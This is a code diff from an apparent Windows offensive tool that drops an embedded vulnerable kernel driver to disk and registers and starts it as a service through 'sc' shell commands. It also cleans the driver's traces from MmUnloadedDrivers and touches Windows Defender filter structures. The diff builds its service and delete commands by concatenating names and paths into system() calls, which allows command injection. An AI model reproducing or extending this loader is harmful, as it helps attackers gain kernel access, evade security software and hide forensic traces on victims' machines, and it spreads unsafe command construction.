@@ -8,11 +8,15 @@ NTSTATUS VulnurableService::UnloadVulnurableDriver(HANDLE* VulnHandle, char Vuln
 	if (*VulnHandle != 0 && *VulnHandle != INVALID_HANDLE_VALUE) {
 		CloseHandle(*VulnHandle);
 	}
-	const char* ReplaceArr[2] = { ServiceName, VulnDriverPath };
-	const char* SymbolsArr = "~`";
-	const char* RegisterCommand[3] = { "sc stop ~", "sc delete ~", "del /s /q `"};
-
-	if (!general::PerformCommand(RegisterCommand, ReplaceArr, SymbolsArr, 3, 2)) {
+	char StopCommand[MAX_PATH] = "sc stop ";
+	strcat_s(StopCommand, ServiceName);
+	char DeleteCommand[MAX_PATH] = "sc delete ";
+	strcat_s(DeleteCommand, ServiceName);
+	char UnloadingCommand[1024] = "del /s /q ";
+	strcat_s(UnloadingCommand, VulnDriverPath);
+	system(StopCommand);
+	system(DeleteCommand);
+	if (system(UnloadingCommand) == -1) {
 		return STATUS_UNSUCCESSFUL;
 	}
 
@@ -21,11 +25,17 @@ NTSTATUS VulnurableService::UnloadVulnurableDriver(HANDLE* VulnHandle, char Vuln
 
 
 NTSTATUS VulnurableService::RegisterVulnurableDriver(char VulnDriverPath[], const char* ServiceName) {
-	const char* ReplaceArr[2] = { ServiceName, VulnDriverPath };
-	const char* SymbolsArr = "`~";
-	const char* RegisterCommand[1] = { "sc create ` type=kernel start=demand binPath=~" };
-
-	if (!general::PerformCommand(RegisterCommand, ReplaceArr, SymbolsArr, 1, 2)) {
+	char StopCommand[MAX_PATH] = "sc stop ";
+	strcat_s(StopCommand, ServiceName);
+	char DeleteCommand[MAX_PATH] = "sc delete ";
+	strcat_s(DeleteCommand, ServiceName);
+	char RegistrationCommand[1024] = "sc create ";
+	strcat_s(RegistrationCommand, ServiceName);
+	strcat_s(RegistrationCommand, " type=kernel start=demand binPath=");
+	strcat_s(RegistrationCommand, VulnDriverPath);
+	system(StopCommand);
+	system(DeleteCommand);
+	if (system(RegistrationCommand) == -1) {
 		return STATUS_UNSUCCESSFUL;
 	}
 	return STATUS_SUCCESS;
@@ -33,18 +43,16 @@ NTSTATUS VulnurableService::RegisterVulnurableDriver(char VulnDriverPath[], cons
 
 
 NTSTATUS VulnurableService::StartVulnurableDriver(const char* ServiceName) {
-	const char* ReplaceArr[1] = { ServiceName };
-	const char* SymbolsArr = "~";
-	const char* StartCommand[1] = { "sc start ~" };
-
-	if (!general::PerformCommand(StartCommand, ReplaceArr, SymbolsArr, 1, 1)) {
+	char StartCommand[MAX_PATH] = "sc start ";
+	strcat_s(StartCommand, ServiceName);
+	if (system(StartCommand) == -1) {
 		return STATUS_UNSUCCESSFUL;
 	}
 	return STATUS_SUCCESS;
 }
 
 
-NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR VulnDriverName, const char* SymbolicLink, const char* ServiceName, const BYTE DriverData[], ULONG DriverTimestamp, PVOID* MainKernelBase) {
+NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR VulnDriverName, const char* SymbolicLink, const char* ServiceName, const BYTE DriverData[], ULONG DriverTimestamp, PVOID* MainKernelBase, ULONG64 VulnSize) {
 	DWORD Status = 0;
 	char VulnDriverPath[MAX_PATH] = { 0 };
 	WCHAR WideVulnDriverPath[MAX_PATH] = { 0 };
@@ -58,8 +66,25 @@ NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR Vuln
 	PVOID ActualWdFilterList = NULL;
 	PVOID ActualWdFilterCount = NULL;
 	PVOID ActualFreeDriverInfo = NULL;
+	char StopCommand[MAX_PATH] = "sc stop ";
+	strcat_s(StopCommand, ServiceName);
+	char DeleteCommand[MAX_PATH] = "sc delete ";
+	strcat_s(DeleteCommand, ServiceName);
+	char UnloadingCommand[1024] = "del /s /q ";
 	general::GetCurrentPathRegular(VulnDriverPath, VulnName);
 	general::CharpToWcharp(VulnDriverPath, WideVulnDriverPath);
+	strcat_s(UnloadingCommand, VulnDriverPath);
+
+
+	// Delete remaining data:
+	system(StopCommand);
+	system(DeleteCommand);
+	if (system(UnloadingCommand) == -1) {
+		return STATUS_UNSUCCESSFUL;
+	}
+
+
+	// Check if driver is still active:
 	if (VulnurableDriver::HelperFunctions::IsAlreadyRunning(SymbolicLink)) {
 		return ERROR_ALREADY_EXISTS;
 	}
@@ -67,7 +92,7 @@ NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR Vuln
 
 
 	// Get the vulnurable driver in a file from the memory data:
-	Status = specific::MemoryToFile(VulnDriverName, (BYTE*)DriverData, sizeof(DriverData));
+	Status = specific::MemoryToFile(WideVulnDriverPath, (BYTE*)DriverData, VulnSize);
 	if (Status != 0) {
 		wprintf(L"[-] Failed to load vulnurable driver data into a file (%s): %d\n", VulnDriverName, Status);
 		return Status;
@@ -87,7 +112,7 @@ NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR Vuln
 
 	// Check if driver was loaded correctly by trying to get a handle with the symbolic link:
 	*VulnHandle = CreateFileA(SymbolicLink, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (*VulnHandle == NULL || *VulnHandle == INVALID_HANDLE_VALUE){
+	if (*VulnHandle == INVALID_HANDLE_VALUE){
 		printf("[-] Failed to load vulnurable driver (handle = NULL/INVALID_HANDLE_VALUE): %d\n", GetLastError());
 		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
 		return STATUS_UNSUCCESSFUL;
@@ -123,7 +148,7 @@ NTSTATUS VulnurableDriver::LoadVulnurableDriver(HANDLE* VulnHandle, LPCWSTR Vuln
 
 
 	// Clear the remainers of the vulnurable driver from MmUnloadedDrivers:
-	if (!NT_SUCCESS(VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(VulnHandle, KernelBaseAddress, VulnDriverName))) {
+	if (!VulnurableDriver::PersistenceFunctions::CleanMmUnloadedDrivers(VulnHandle, KernelBaseAddress, VulnDriverName)) {
 		printf("[-] Failed to clear driver entry from MmUnloadedDrivers: %d\n", GetLastError());
 		VulnurableService::UnloadVulnurableDriver(VulnHandle, VulnDriverPath, ServiceName);
 		return STATUS_UNSUCCESSFUL;
